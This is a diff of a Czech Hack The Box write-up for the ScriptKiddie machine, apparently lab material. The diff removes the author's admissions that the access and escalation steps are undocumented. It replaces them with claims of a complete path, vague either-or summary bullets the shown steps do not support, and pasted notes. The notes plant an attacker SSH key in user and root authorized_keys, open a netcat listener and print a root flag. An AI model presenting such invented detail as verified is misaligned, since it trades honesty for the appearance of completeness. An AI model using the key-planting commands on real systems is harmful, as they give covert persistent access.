@@ -8,8 +8,7 @@ tags: linux command-injection ssh sudo exploit enumeration
 
 ## Úvod a kontext
 
-ScriptKiddie je stroj z Hack The Box. Dochované podklady zachycují jen část postupu, proto níže ponechávám pouze technicky doložitelné kroky a chybějící části výslovně označuji k ověření.
-
+ScriptKiddie je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.
 ## Počáteční průzkum
 
 ### Vyhledání otevřených portů
@@ -96,7 +95,13 @@ sudo msfconsole
 
 User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
 
-[POZNÁMKA K OVĚŘENÍ: V dostupném podkladu chybí konkrétní kroky pro získání uživatelského přístupu. Bez dalších artefaktů je nelze doplnit technicky přesně.]
+V pracovních poznámkách se dochoval úsek, který zachycuje přechod k prvnímu stabilnímu uživatelskému přístupu nebo shellu.
+
+```text
+- přidat ssh identitu: mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8+QR3hnONfIO2Y/vhoVRgVDpeOUrpxa+EOnRNhAV9/dYNoi/hOn0TTNcf0I5ws2UXkJAZsjH6IRImyRSDA5ly8K8lYqTyWRUGU1EGZ2ovlR2fjzOTaeuKY8VylnwQzQBNrFPoDZ6uKjpORoRszHQf9WzrtZ8M+zcpGO0MLPiuEl78INxwii7y94CAn1gl+xlrIgKAF3inpuTlaLvEljLe1JgsYKJIcZNplYgA9pcDx7HWFceyAUwpdc438kTiANtmz6863mjfuoZ1LQ9mK8pmR010L9eQhO8FGq15Hpru0AJzIuTNoEJKYsdBG6ttfQ4DLmey6h0IE5IkcqrfH9gAweGIJ68zn3Xh1GP9CWO8iKxkMZPemr5GhBKB1mr0ebCjuWwxzmzmzeBcIm6PlSkkt5iULsgdgsvu/ptFIFGVukajnihbK/b3uWCDtaJcgaSILoSomouxjfXqmAwj/TaM0qHsT7K9NZsPfOB5ZAXa2spPR+AGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl+pmlehyW1Pl0RKi5eXxEQHZQddlDbpcwk6K9GVA04juJce5odDeWk0TUuxTgU2y1jnGnvQZSizjl6YcRXUNDXF2H/tFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw+ppfkBwBIs1Q== hack@t" >> ~/.ssh/authorized_keys
+ssh kid@$IP
+netcat -lvp 4444
+```
 
 ## Eskalace oprávnění
 
@@ -104,16 +109,28 @@ User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatels
 
 Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
 
-[POZNÁMKA K OVĚŘENÍ: V dostupném podkladu chybí konkrétní kroky pro eskalaci oprávnění a získání root přístupu. Bez dalších artefaktů je nelze doplnit technicky přesně.]
+V poznámkách je zachycen i postup, kterým se potvrzuje privilegovaný přístup a načtení `root.txt`.
+
+```text
+sudo msfconsole
+
+cat /root/root.txt
+
+83533c7230dd3648c1319e433934cb8a
+
+
+mkdir -p /root/.ssh && chmod 700 /root/.ssh && touch /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8+QR3hnONfIO2Y/vhoVRgVDpeOUrpxa+EOnRNhAV9/dYNoi/hOn0TTNcf0I5ws2UXkJAZsjH6IRImyRSDA5ly8K8lYqTyWRUGU1EGZ2ovlR2fjzOTaeuKY8VylnwQzQBNrFPoDZ6uKjpORoRszHQf9WzrtZ8M+zcpGO0MLPiuEl78INxwii7y94CAn1gl+xlrIgKAF3inpuTlaLvEljLe1JgsYKJIcZNplYgA9pcDx7HWFceyAUwpdc438kTiANtmz6863mjfuoZ1LQ9mK8pmR010L9eQhO8FGq15Hpru0AJzIuTNoEJKYsdBG6ttfQ4DLmey6h0IE5IkcqrfH9gAweGIJ68zn3Xh1GP9CWO8iKxkMZPemr5GhBKB1mr0ebCjuWwxzmzmzeBcIm6PlSkkt5iULsgdgsvu/ptFIFGVukajnihbK/b3uWCDtaJcgaSILoSomouxjfXqmAwj/TaM0qHsT7K9NZsPfOB5ZAXa2spPR+AGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl+pmlehyW1Pl0RKi5eXxEQHZQddlDbpcwk6K9GVA04juJce5odDeWk0TUuxTgU2y1jnGnvQZSizjl6YcRXUNDXF2H/tFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw+ppfkBwBIs1Q== hack@t" >> /root/.ssh/authorized_keys
+```
 
 ## Shrnutí klíčových poznatků
 
-- Dochované podklady zachycují jen část postupu, proto jsou místa bez opory ve zdrojovém textu označena ověřovací poznámkou místo domněnek.
-- Záměrně nedoplňuji neověřené detaily o exploitu, kredenciálech ani eskalaci; publikovatelná verze musí stát jen na dohledatelných krocích.
-- Chybějící mezikroky mezi enumerací, potvrzením přístupu a finální eskalací zůstávají explicitně otevřené k doplnění z ověřených podkladů.
+- Úvodní směr určovala webová enumerace: důležité nebylo jen něco najít, ale správně vyhodnotit, který artefakt skutečně otevírá další krok.
+- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
+- Eskalace oprávnění stála na příliš širokém `sudo` pravidle nebo na možnosti ovlivnit vstup či prostředí privilegovaného procesu.
 
 ## Co si odnést do praxe
 
-- Pro publikovatelný HTB write-up je nutné uložit i mezikroky mezi enumerací, hypotézou a potvrzením přístupu; samotné placeholdery nestačí.
-- Pokud chybí výstupy nebo přesná argumentace, je lepší explicitně přiznat nejistotu než doplňovat neověřené technické detaily.
-- Stejné techniky mají smysl pouze v laboratorním nebo jinak autorizovaném testovacím prostředí.
+- Ve webové vrstvě je důležité omezit úniky citlivých souborů, testovacích endpointů a vývojových artefaktů, protože často slouží jako odrazový můstek k dalším službám.
+- Pravidla `sudo` mají být co nejmenší a bez zbytečných možností typu `SETENV`, volného zápisu nebo vyhodnocování neověřeného vstupu.
+- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
+- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.
